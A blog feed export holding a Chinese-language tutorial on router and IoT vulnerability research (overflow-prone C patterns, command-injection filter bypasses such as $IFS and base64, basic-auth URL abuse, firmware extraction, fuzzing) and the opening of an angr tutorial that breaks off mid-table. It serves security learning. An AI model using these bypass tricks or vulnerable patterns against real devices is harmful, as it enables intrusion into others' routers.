    <content type="html"><![CDATA[<h2 id="前置基础"><a href="#前置基础" class="headerlink" title="前置基础"></a>前置基础</h2><h3 id="路由的漏洞利用"><a href="#路由的漏洞利用" class="headerlink" title="路由的漏洞利用"></a>路由的漏洞利用</h3><h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><ol><li><p><strong>密码破解</strong></p><p>默认密码、弱口令、字典爆破、侧信道（利用服务器响应时间、返回数据包特征，侧信道爆破密码或<code>PIN</code>码）</p></li><li><p><strong>web漏洞</strong></p><p>访问<code>web</code>管理服务与<code>web</code>界面交互，进行渗透（<code>sql</code>注入、<code>rce</code>、<code>csrf</code>、<code>xss</code>）</p></li><li><p><strong>后门</strong></p></li><li><p><strong>缓冲区溢出</strong></p><p>危险函数：<code>strcpy</code>、<code>sprintf</code>、<code>snprintf</code>、<code>strchr</code>、<code>gets</code>，<code>fgetc</code></p><ul><li><p><code>sprintf</code>：<code>sprintf(format,arg1,arg2,arg++)</code>格式化中有<code>%s</code>且没有判断输入长度可能造成栈溢出</p></li><li><p><code>snprintf</code>：返回值是输入长度不是输出长度</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//http1长度大于stack时left也大于stack，snprintf的size为unsigned类型，http2可输入size为负数转成的超大正数</span><span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token function">snprintf</span><span class="token punctuation">(</span>stack<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buf_from_http1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">snprintf</span><span class="token punctuation">(</span>stack<span class="token operator">+</span>left<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token operator">-</span>left<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> buf_from_http2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><code>strchr</code>:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//复制长度由？前字符串长度决定，例如index.phpaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa?a=1</span><span class="token keyword">char</span> <span class="token operator">*</span>query <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token char">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strncpy</span><span class="token punctuation">(</span>stack<span class="token punctuation">,</span> url<span class="token punctuation">,</span> quey <span class="token operator">-</span> url <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><code>fgetc</code>：读取单个字符，一般会循环输入，注意循环边界是否会越界</p></li></ul></li><li><p><strong>逻辑漏洞</strong></p><p>对多个功能点组合利用，挖掘攻击链</p></li><li><p><strong>注入类</strong></p><p>敏感函数：<code>system</code>、<code>popen</code>、<code>exec</code>、<code>execve</code></p><p>过滤关键词：例如<code>$IFS</code>绕过空格，<code>xxd</code>、<code>base64</code>编码</p></li></ol><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p><a href="https://github.com/giantbranch/mipsAudit">https://github.com/giantbranch/mipsAudit</a></p><p><code>mips</code>静态汇编审计辅助脚本，通过回溯敏感函数审计危险函数</p><p>在<code>IDA-&gt;file-&gt;Script FIle</code>中加载即可使用，加载完成会在控制台输出相应信息，点击跳转，对应位置被高亮显示</p><h3 id="mips-linux"><a href="#mips-linux" class="headerlink" title="mips linux"></a>mips linux</h3><p><code>mips linux</code>：使用<code>mips</code>指令架构的<code>linux</code>系统称为<code>mips linux</code>，广泛应用于嵌入式系统。路由器一般使用<code>mips32</code>和<code>arm</code>指令架构</p><p><code>risc</code>架构：精简指令集，包含<code>mips</code>、<code>arm</code>、<code>risc-v</code></p><h3 id="busybox"><a href="#busybox" class="headerlink" title="busybox"></a>busybox</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p><code>busybox</code>：一个精简终端，路由器的<code>shell</code>是经过裁剪的<code>busybox</code>，<code>shell</code>命令本质是指向<code>busybox</code>的符号链接</p><h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ busybox <span class="token parameter variable">--help</span>        <span class="token comment"># 查看当前路由器的BusyBox支持的命令</span>$ <span class="token function">uname</span> <span class="token parameter variable">-r</span>              <span class="token comment"># 打印系统信息 + 显示当前运行的Linux内核版本(-r)</span>$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>                <span class="token comment"># 查看当前目录下包含隐藏文件的所有文件(-a) + 文件的详细内容(-l)</span>$ <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /tmp           <span class="token comment"># 强制删除/tmp目录 + 目录下的所有文件(-r) + 无需确认(-f)</span>$ <span class="token function">cp</span> <span class="token parameter variable">-R</span> /tmp ./now      <span class="token comment"># 将/tmp目录复制到./now下</span>$ <span class="token function">du</span> <span class="token parameter variable">-sk</span> fireware.bin   <span class="token comment"># 以KB为单位(-sk)查看bin文件大小</span>$ <span class="token function">ps</span> <span class="token parameter variable">-ef</span>                <span class="token comment"># 查看当前系统正在运行的所有进程 + PID PPID(-f)</span>$ <span class="token function">kill</span> <span class="token parameter variable">-9</span> pid           <span class="token comment"># 强制(-9)终止进程号为pid的进程</span>$ <span class="token function">killall</span> <span class="token parameter variable">-9</span> xxx        <span class="token comment"># 强制(-9)终止进程名为xxx的进程</span>$ <span class="token function">ifconfig</span> <span class="token parameter variable">-a</span>           <span class="token comment"># 查看所有网卡的信息(-a)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p><strong>CRLF:</strong> 表示回车和换行，在<code>C</code>语言中表达为 <code>\r\n</code>，对应的十六进制数是<code>0A0D</code>，<code>http</code>请求中所有换行都要用<code>\r\n</code>，因为<code>win</code>的回车相当于<code>linux</code>的回车加换行</p><p>**URI:**统一资源标识符，包含协议、主机名、端口号、路径、查询字符串、片段标识符（以<code>#</code>开始指向资源内部特定部分），例如：<code>https://www.example.com/path/to/resource?query=param#fragment</code></p><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><table><thead><tr><th>路径</th><th>作用</th></tr></thead><tbody><tr><td>&#x2F;bin  &#x2F;sbin  &#x2F;usr&#x2F;bin  &#x2F;usr&#x2F;sbin</td><td>存放路由器中的应用程序</td></tr><tr><td>&#x2F;lib  &#x2F;usr&#x2F;lib</td><td>存放程序运行时需要的动态库文件</td></tr><tr><td>&#x2F;etc</td><td>存放配置文件（程序自启动配置文件、脚本文件、服务程序配置文件）</td></tr></tbody></table><h3 id="修复路由器的运行环境"><a href="#修复路由器的运行环境" class="headerlink" title="修复路由器的运行环境"></a>修复路由器的运行环境</h3><p>拿到路由器固件首先需要将路由的环境模拟起来，但是由于缺少硬件在固件运行过程中容易缺失工作模块导致仿真和动调失败</p><p>修复路由器程序的大致执行流程：</p><ul><li>运行程序定位导致程序异常的函数</li><li>分析异常函数，编写具有相同功能的函数，在函数中伪造执行流程和数据，并将编写的函数封装成新的动态库</li><li>使用<code>LD_PRELOAD</code>环境变量加载新的动态库来劫持目标程序中的异常函数，使目标程序执行动态库中的函数</li></ul><h2 id="路由器漏洞原理与利用"><a href="#路由器漏洞原理与利用" class="headerlink" title="路由器漏洞原理与利用"></a>路由器漏洞原理与利用</h2><h3 id="路由器web漏洞"><a href="#路由器web漏洞" class="headerlink" title="路由器web漏洞"></a>路由器web漏洞</h3><ul><li><p>xss</p></li><li><p>csrf</p></li><li><p>路由器基础认证漏洞</p><p><a href="http://admin:admin@192.168.0.1以这种形式可以不需要输入用户名和密码就能完成路由器的直接认证和跳转/">http://admin:admin@192.168.0.1以这种形式可以不需要输入用户名和密码就能完成路由器的直接认证和跳转</a></p><p>通过基础认证可以构造出可跨站的方法，例如让用户点击超链接（钓鱼）、让浏览器自动请求资源，允许攻击者利用一个网站的漏洞影响另一个网站，可以搭配xss和csrf</p><p>xss和csrf是基于登陆状态，路由器基础认证漏洞可以变成登陆状态</p></li></ul><h3 id="路由器后门漏洞"><a href="#路由器后门漏洞" class="headerlink" title="路由器后门漏洞"></a>路由器后门漏洞</h3><p>将可以绕过安全控制而获取路由器访问权的漏洞统一称为路由器后门漏洞</p><p>复现文章：</p><ol><li><a href="https://www.freebuf.com/news/others/266860.html">《揭秘家用路由器0day漏洞挖掘技术》磊科全系列路由器后门漏洞分析</a>、<a href="https://www.anquanke.com/post/id/246510#h2-0">磊科全系列路由器后门漏洞分析</a></li><li><a href="https://cloud.tencent.com/developer/article/1035383">32764端口后门重出江湖，影响多款路由器</a>、<a href="https://github.com/elvanderb/TCP-32764">elvanderb&#x2F;TCP-32764</a></li></ol><h3 id="路由器溢出漏洞"><a href="#路由器溢出漏洞" class="headerlink" title="路由器溢出漏洞"></a>路由器溢出漏洞</h3><p>mips32的函数调用和栈布局不同于x86</p><h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h4><p>没有rbp，进入函数时栈顶指针上抬（减）N字节开辟栈帧，函数返回时重新加上N恢复现场。由于不能随意移动栈指针，所以寄存器压栈和出栈时都必须指定偏移量</p><p>函数调用前，caller 函数会在自己的栈顶预留一部分空间来保存 callee 函数的参数；返回地址会直接存入 $RA 寄存器</p><p>函数调用时，前4个参数通过 <em>a</em>0-a3 传递，参数超过4个会被放入调用参数空间</p><h4 id="栈布局"><a href="#栈布局" class="headerlink" title="栈布局"></a>栈布局</h4><p>mips32架构有两种函数类型：</p><ul><li>叶子函数：不会再调用其他函数</li><li>非叶子函数</li></ul><p>函数调用过程（A调用B）：</p><ol><li><p>复制当前 <code>$PC</code> 寄存器的值到 <code>$RA</code> 寄存器，然后跳转到函数 B 执行代码</p></li><li><p>程序跳转到函数 B 后</p><ul><li><p>如果函数 B 是<strong>非叶子函数</strong>，则函数 B 里首先会把函数 A 的返回地址入栈，函数返回时，函数 B 先从栈中取出被保存在栈上的返回地址，然后将返回地址存入寄存器 <code>$RA</code>，再使用 “jr $RA” 指令返回函数 A</p></li><li><p>如果函数 B 是<strong>叶子函数</strong>，则在函数返回时直接使用 “jr $RA” 指令返回函数 A</p></li></ul></li></ol><p>参数传递：</p><p>mips通过a0-a3传递前4个参数，其余通过栈传递，栈帧结构如下，栈空间不需要保留前四个参数，但是caller函数预留前四个参数的栈内存空间，callee函数内分配栈空间后将寄存器值复制到caller预留位置中</p><h4 id="缓冲区溢出漏洞利用"><a href="#缓冲区溢出漏洞利用" class="headerlink" title="缓冲区溢出漏洞利用"></a>缓冲区溢出漏洞利用</h4><p>非叶子函数与正常溢出利用相同，叶子函数一般无法直接利用，除非存在可以溢出大量数据的情况，就可以通过一路覆盖到父函数中的返回地址去劫持程序流</p><h2 id="软件层分析"><a href="#软件层分析" class="headerlink" title="软件层分析"></a>软件层分析</h2><h3 id="固件获取"><a href="#固件获取" class="headerlink" title="固件获取"></a>固件获取</h3><p>路由器固件是包含操作系统的内核以及文件系统的软件，包含了所有可执行程序和配置文件信息。</p><h4 id="获取途径"><a href="#获取途径" class="headerlink" title="获取途径"></a>获取途径</h4><ul><li>路由器厂商网站下载</li><li>登陆路由web管理界面获取相关信息，到对应网站下载固件，通过后台选择新固件升级</li><li>硬件接入，从路由器flash提取固件</li><li>云市场：淘宝，咸鱼</li></ul><h3 id="文件系统-1"><a href="#文件系统-1" class="headerlink" title="文件系统"></a>文件系统</h3><h4 id="基础理论"><a href="#基础理论" class="headerlink" title="基础理论"></a>基础理论</h4><p>文件系统：路由器的文件系统是用于<strong>存储操作系统、配置文件、日志文件</strong>等数据的系统，不同路由器文件系统格式不同，<strong>根文件系统会被打包</strong>成路由器使用的文件系统格式再<strong>组装到固件中</strong></p><p>压缩格式：由于路由器设备大小有限所以存在各种针对文件系统的<strong>压缩格式</strong>，常见的有<code>Squashfs</code>，一个有极高压缩率的只读格式的文件系统</p><p>Squashfs：路由器<strong>根文件系统</strong>通常按照<code>Squashfs</code>文件系统常用压缩格式（GZIP, LZMA, LZO, XZ）中的一种进行打包写成<code>Squashfs</code>文件系统，再<strong>结合固件头部、压缩后的内核等部分形成完整固件</strong></p><p>系统启动后，会将文件系统保存在一个压缩过的文件系统文件中，这个文件可以使用换回的形式挂载并对其中的文件进行访问，当进程需要某些文件时，<strong>仅将对应部分的压缩文件解压缩</strong></p><h4 id="手工提取文件系统"><a href="#手工提取文件系统" class="headerlink" title="手工提取文件系统"></a>手工提取文件系统</h4><p>难点：</p><ol><li>不同的操作系统使用的文件系统不同</li><li>路由的文件系统的压缩算法有可能存在差异</li><li>有些路由甚至使用非标准的甚至是加密的压缩算法来打包文件系统</li></ol><p>常见解包手法：通过手工分析的方式从大量字节码数据中正确地识别出文件系统、固件解密、利用工具自动化分析</p><ul><li><p>信息收集：利用 file 查看文件类型，file 命令通过定义的 magic 签名文件来识别各种格式，在头部添加内容就会无法识别</p></li><li><p>进一步检索：</p><ul><li><p><code>strings xxx.bin | grep xxx</code>检索 magic 签名头，表明该文件可能包含某个文件系统</p><blockquote><p>cramfs特征：0x28cd3d45</p><p>squashfs特征：sqsh, hsqs, qshs, shsq, hsqt, tqsh, sqlz</p></blockquote><p>端序未知时需要进行两次搜索</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ strings firmware.bin <span class="token operator">|</span> <span class="token function">grep</span> <span class="token variable"><span class="token variable">`</span>python <span class="token parameter variable">-c</span> <span class="token string">'print "\x28\xcd\x3d\x45"'</span><span class="token variable">`</span></span>$ strings firmware.bin <span class="token operator">|</span> <span class="token function">grep</span> <span class="token variable"><span class="token variable">`</span>python <span class="token parameter variable">-c</span> <span class="token string">'print "\x45\x3d\xcd\x28"'</span><span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><code>hexdump -C xxx.bin | grep xx</code>确认某个签名之后检索 magic 签名偏移</p></li><li><p><code>dd | file -</code>确定签名具体偏移时可以用这个指令确认是否匹配某种文件格式</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//magic偏移0x100,复制从0x100开始的0x100字节到out,确认文件属性和大小$ <span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>firmware.bin <span class="token assign-left variable">bs</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token number">100</span> <span class="token assign-left variable">skip</span><span class="token operator">=</span><span class="token number">256</span> <span class="token assign-left variable">of</span><span class="token operator">=</span>out$ <span class="token function">file</span> out<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>dd 可从标准输入或文件中读取数据，根据指定的格式来转换数据，再输出到文件、设备或标准输出</p><p>if&#x3D;文件名：输入文件名，指定源文件</p><p>of&#x3D;文件名：输出文件名，指定目的文件</p><p>ibs&#x3D;bytes：一次读入bytes个字节<br>obs&#x3D;bytes：一次输出bytes个字节<br>bs&#x3D;bytes：同时设置读入&#x2F;输出的块大小为bytes个字节</p><p>cbs&#x3D;bytes：一次转换bytes个字节，即指定转换缓冲区大小</p><p>skip&#x3D;blocks：从输入文件开头跳过blocks个块后再开始复制</p><p>seek&#x3D;blocks：从输出文件开头跳过blocks个块后再开始复制</p><p>count&#x3D;blocks：仅拷贝blocks个块，大小等于ibs指定的字节数</p></blockquote></li><li><p>得到文件大小和偏移之后提取文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//从0x100开始提取1024字节到out$ <span class="token function">dd</span> <span class="token assign-left variable">if</span><span class="token operator">=</span>firmware.bin <span class="token assign-left variable">bs</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">count</span><span class="token operator">=</span><span class="token number">1024</span> <span class="token assign-left variable">skip</span><span class="token operator">=</span><span class="token number">256</span> <span class="token assign-left variable">of</span><span class="token operator">=</span>out.squashfs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>提取文件系统</p><p>提取出文件系统之后还需要<strong>还原文件系统中的根文件系统</strong>，利用 file -m 加载自定义的magic签名文件（这些文件通常包含用于匹配文件类型的模式和规则，包括文件头部的特定字节序列、文件大小、文件内容的特定模式等）以输出更详细的信息，了解压缩方式等，找对应工具解压</p></li></ul><h4 id="自动提取文件系统"><a href="#自动提取文件系统" class="headerlink" title="自动提取文件系统"></a>自动提取文件系统</h4><p>在线网站：<a href="https://zhiwanyuzhou.com/multiple_analyse/firmware/%E6%B2%A1%E6%9C%89%E5%88%86%E6%9E%90%E7%BB%93%E6%9E%9C%E8%AF%B4%E6%98%8E%E5%9B%BA%E4%BB%B6%E6%98%AF%E5%8A%A0%E5%AF%86%E7%9A%84">https://zhiwanyuzhou.com/multiple_analyse/firmware/没有分析结果说明固件是加密的</a></p><p>Binwalk：</p><ul><li><p>扫描固件中包含的所有可识别的文件类型</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ binwalk x.bin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>提取文件，解包出来的 squashfs-root 就是文件系统</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">//-e 按照预定义的配置文件中的提取方法从固件中提取探测到的文件系统//-M 根据 magic 签名扫描结果进行递归提取$ binwalk <span class="token parameter variable">-Me</span> x.bin --run-as<span class="token operator">=</span>root<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>分析可执行程序的指令系统，可以结合 file 和 checksec 确认</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ binwalk <span class="token parameter variable">-A</span> elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>其他用法：<code>--magic</code>指定自定义 magic 签名文件路径或将自定义的签名规则添加到<code>$HOME/.binwalk/magic/binwalk</code>来识别新文件类型，识别成功后可向 Binwalk 配置文件添加这种新文件类型</p></li></ul><h2 id="硬件层分析"><a href="#硬件层分析" class="headerlink" title="硬件层分析"></a>硬件层分析</h2><p>通过路由器硬件提供的接口获取固件，连接计算机和路由器主板，提取路由器数据</p><h3 id="路由器flash"><a href="#路由器flash" class="headerlink" title="路由器flash"></a>路由器flash</h3><p>闪存：路由器常用的一种内存类型，断电后仍能保存数据，存放正在使用的路由器操作系统等数据。</p><p>flash：像硬盘，有多个分区</p><ul><li><p>bootloader</p><p>常见的 bootloader 有 bios、uefi、u-boot 等，其中 u-boot 更多用于嵌入式系统</p><p>bootloader 存储对设备供电后<strong>启动操作系统的引导程序</strong>，<strong>对硬件环境初始化、更新固件、建立内存空间映射表</strong>从而配置适当的系统软硬件环境、调用操作系统内核并加载到内存中运行</p></li><li><p>kernel</p><p>操作系统内核</p></li><li><p>root filesystem</p><p>操作系统的根文件系统，如squashfs，rootfs</p></li><li><p>nvram</p><p>保存路由器配置文件，路由器启动后会从中读取配置文件对路由器进行设置</p></li></ul><h3 id="硬件提取数据思路"><a href="#硬件提取数据思路" class="headerlink" title="硬件提取数据思路"></a>硬件提取数据思路</h3><ul><li>连接主板上的 JTAG 之类调试接口</li><li>从主板上取下 Flash 芯片，通过芯片上的引脚连接编程器，但很容易对路由器造成物理损伤</li><li>利用芯片夹夹住芯片引脚，通过芯片夹接口连接到编程器，这样就不需要将芯片从主板上取下来</li></ul><h3 id="路由器串口"><a href="#路由器串口" class="headerlink" title="路由器串口"></a>路由器串口</h3><p>给开发人员使用，用于访问路由器固件环境、观察boot和调试信息、通过shell与系统进行交互异步串行通信、烧录固件等</p><p>路由器主要串口URAR，包含引脚：VCC（电源电压） GND（接地引脚） TXD（数据发送引脚） RXD（数据接收引脚）</p><h2 id="漏挖思路和方法"><a href="#漏挖思路和方法" class="headerlink" title="漏挖思路和方法"></a>漏挖思路和方法</h2><h3 id="分析流程"><a href="#分析流程" class="headerlink" title="分析流程"></a>分析流程</h3><p>对系统进行仿真，找开放了监听端口的服务，抓包分析，从通信网络层分析</p><ul><li><p>记录常见服务端口</p><p>http 80https 443DNS 53ftp 21ssh 22</p></li><li><p>从网络服务着手</p><p>抓包看本地回环&#x2F;整个局域网下的流量，能看见心跳包等数据报文，观察哪个程序起了主导的交互作用；看启动了什么进程，有哪些针对 <code>0.0.0.0</code> 的端口监听</p></li></ul><p>分析信息路由、路由导向，找分发网络消息的路由和处理逻辑，需要积累，例如 tenda 路由器的 web 启动程序通常在 bin 目录下的 httpd文件</p><p>确定漏挖目标进程，分析通信协议和与程序进行交互的方式，后续进行静态代码审计和模糊测试</p><h3 id="静态代码审计"><a href="#静态代码审计" class="headerlink" title="静态代码审计"></a>静态代码审计</h3><p>找核心逻辑的思路：</p><ol><li><p>多看源码，了解开发思路，熟悉相关框架</p></li><li><p>查找对 <code>socket, bind, listen, accept</code> 这类网络通信函数的调用，可以通过这些函数了解到当前<strong>程序的网络服务相关信息</strong></p><p>查找对 <code>sendmsg, recvmsg, read, write</code> 这类函数的调用，一般能够顺着这些交互点找到<strong>报文处理逻辑</strong></p></li><li><p>使用 python 脚本建立 socket 连接，查看回显，利用这些信息去搜索相应的字符串，查<strong>引用定位</strong>主要逻辑</p></li><li><p>查看程序的字符串，从一些输出报错、记录日志等相关字符串中窥探到函数功能</p><p>如输出信息 <code>option xxx</code> 一般是指命令的选项，类似 -r -a 那种参数，那这一部分代码就可能在执行某种选项功能</p></li></ol><p>分析敏感函数调用、数据处理，观察是否有溢出风险，以及数据处理不当导致的命令注入、逻辑漏洞等</p><p>从数据来源角度进行分析：</p><ul><li>命令行参数：对 argv 的处理</li><li>环境变量：getenv</li><li>文件、数据报文数据读取：read, fscanf, getc, fgetc, fgets, vfscanf</li><li>键盘输入、stdin：read, scanf, getchar, gets</li><li>网络数据：read, recv, recvfrom</li></ul><p>从数据操作角度进行分析：</p><ul><li>命令执行：system, popen, execve, execl, execvp</li><li>字符串拼接、复制：strcat, strcpy, strncpy</li><li>格式化字符串：sprintf, snprintf</li></ul><h3 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h3><p>Fuzzing 的大致流程：确定输入变量 -&gt;生成模糊测试数据 -&gt; 执行模糊测试 -&gt; 监视异常 -&gt; 根据被测试系统状态判断是否存在潜在安全漏洞</p><p>主流的 fuzz 工具有 AFL++、Boofuzz等，选择工具需要考虑 fuzz 工具的区别和使用</p><ol><li>fuzz 目标语言和平台：程序？内核？协议？…</li><li>变异策略 - 原语：了解工具的常用 API 使用方法，熟悉测试脚本编写</li><li>状态管理、性能和效率：fuzz 在某种程度上来说是比较低效的漏挖手段，这种情况下怎么判断 Crash 和有效值，减少误报</li><li>特殊情况：如分析目标在通信时会进行多次交互</li></ol><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>嘿嘿我ve1宝写的OvO</p><p><a href="https://xz.aliyun.com/t/16512">https://xz.aliyun.com/t/16512</a></p><p><a href="https://xz.aliyun.com/t/16511">https://xz.aliyun.com/t/16511</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前置基础&quot;&gt;&lt;a href=&quot;#前置基础&quot; class=&quot;headerlink&quot; title=&quot;前置基础&quot;&gt;&lt;/a&gt;前置基础&lt;/h2&gt;&lt;h3 id=&quot;路由的漏洞利用&quot;&gt;&lt;a href=&quot;#路由的漏洞利用&quot; class=&quot;headerlink&quot; title=&quot;路由的</summary>
      
    
    
    
    <category term="IoT" scheme="https://starrysky1004.github.io/categories/IoT/"/>
    
    
    <category term="IoT" scheme="https://starrysky1004.github.io/tags/IoT/"/>
    
  </entry>
  
  <entry>
    <title>angr学习与angr_CTF题解（持续更新）</title>
    <link href="https://starrysky1004.github.io/2024/12/17/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/"/>
    <id>https://starrysky1004.github.io/2024/12/17/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/angr-xue-xi-yu-angr-ctf-ti-jie-chi-xu-geng-xin/</id>
    <published>2024-12-16T16:18:27.000Z</published>
    <updated>2024-12-16T16:26:47.233Z</updated>
    
    <content type="html"><![CDATA[<h2 id="angr基础知识"><a href="#angr基础知识" class="headerlink" title="angr基础知识"></a>angr基础知识</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>angr 是一个支持多处理架构的用于二进制文件分析的工具包，它提供了动态符号执行的能力以及多种静态分析的能力。它可以被使用者扩展，用于自动化逆向工程、漏洞挖掘等多个方面</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ol><li>安装 angr</li></ol>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sudo</span> pip <span class="token function">install</span> angr<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>安装 angr-utils</li></ol>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$mkdir</span> angr-dev<span class="token variable">$cd</span> angr-dev<span class="token variable">$git</span> clone https://github.com/axt/bingraphvis<span class="token variable">$pip</span> <span class="token function">install</span> <span class="token parameter variable">-e</span> ./bingraphvis<span class="token variable">$git</span> clone https://github.com/axt/angr-utils<span class="token variable">$pip</span> <span class="token function">install</span> <span class="token parameter variable">-e</span> ./angr-utils<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><h4 id="project"><a href="#project" class="headerlink" title="project"></a>project</h4><p>project 类是 angr 的主类，也是angr的开始，通过初始化 project 类加载二进制文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angrp <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'file_path'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其他可选参数</p><table><thead><tr><th>名称</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>auto_load_libs</td><td>是否自动加载程序的依赖（少加载无关结果的库可以提升angr效率）</td><td>auto_load_libs　&#x3D; False</td></tr><tr><td>skip_libs</td><td>希望避免加载的库</td><td>skip_libs &#x3D; 库名</td></tr><tr><td>except_missing_libs</td><td>无法解析库时是否抛出异常</td><td>True &#x2F; False</td></tr><tr><td>force_load_libs</td><td>强制加载的库</td><td>force_load_libs &#x3D; 库名</td></tr><tr><td>ld_path</td><td>共享库的优先搜索路径</td><td>ld_path &#x3D; 路径名</td></tr></tbody></table><p>project 类的方法和属性：</p><ul><li><p>p.arch : 文件架构</p></li><li><p>hex(p.entry) ： 程序入口点</p></li><li><p>p.filename ： 加载的文件名</p></li><li><p>p.arch.bits ： 字长（32位 &#x2F; 64位）</p></li><li><p>p.arch.memory_endness ： 大小端</p></li></ul><h4 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h4><p>project只是加载二进制文件，实际是对simstate对象操作</p><p>simstate对象是程序的状态，包含运行时的一切信息，例如寄存器、内存值、文件系统、<strong>符号变量</strong></p><p>创建状态</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">state <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>预设状态：</p><p>前两个比较常用，blank_state用于跳过一些极大降低angr效率的指令，初始时rax的数据类型都是bit vector</p><table><thead><tr><th>预设状态方式</th><th>描述</th></tr></thead><tbody><tr><td>entry_state</td><td>初始化状态为程序运行到程序入口点处的状态</td></tr><tr><td>blank_state(addr&#x3D;)</td><td><strong>大多数数据都没有初始化</strong>，状态中下一条指令为addr处的指令</td></tr><tr><td>full_init_state</td><td>共享库和预定义内容已经加载完毕，例如刚加载完共享库</td></tr><tr><td>call_state</td><td>准备调用函数的状态</td></tr></tbody></table><p>factory 类的方法：</p><ul><li>state.regs.rax</li></ul><h4 id="simgr"><a href="#simgr" class="headerlink" title="simgr"></a>simgr</h4><p>simulation manager（SM）模拟管理器，要分析程序就要让它到达下一个状态</p><p>使用 simgr 创建 sm， 需要传入 state 或 state的列表</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">simgr <span class="token operator">=</span> p<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>state<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>sm 有许多被成为 stash 的列表，保存了处于某种状态的 state</p><p>stash 是一个列表，可以用 python 方式遍历，angr 也提供了获取方式：stash 名字前加上 one_ 得到第一个状态，加上 mp_ 得到一个 mulpyplexed 版本的stash，例如<code>simgr.one_active</code></p><table><thead><tr><th>stash</th><th>描述</th></tr></thead><tbody><tr><td>active （默认值）</td><td>保存接下来可以执行并且将要执行的状态</td></tr><tr><td>deadended</td><td>由于某些原因不能继续执行的状态，例如没有合法指令，或者有非法指针</td></tr><tr><td>pruned</td><td>与 solve 的策略有关，当发现一个不可解的节点后，其后面所有的节点都优化掉放在 pruned 里</td></tr><tr><td>unconstrained</td><td>如果创建 SM 时启用了 